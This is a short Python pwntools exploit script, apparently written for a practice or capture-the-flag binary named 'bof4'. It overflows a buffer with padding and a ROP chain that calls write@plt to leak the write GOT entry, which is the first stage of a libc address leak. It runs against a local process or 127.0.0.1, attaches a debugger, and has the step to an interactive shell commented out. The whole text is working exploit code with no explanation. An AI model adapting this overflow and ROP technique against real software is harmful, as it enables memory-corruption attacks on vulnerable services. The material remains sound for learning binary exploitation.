from pwn import *

HOST = '127.0.0.1'
PORT = 4000

local = True


if local:
    conn = process("./bof4")
else:
    conn = remote(HOST, PORT)

write_plt = 0x08048350
write_got = 0x0804a018

gdb.attach(conn)

ROP = "A" * 51
ROP += p32(write_plt)
ROP += "BBBB"
ROP += p32(1)
ROP += p32(write_got)
ROP += p32(4)

print conn.recv(1024)
conn.sendline(ROP)
print hex(u32(conn.recv(4)))

#conn.interactive()
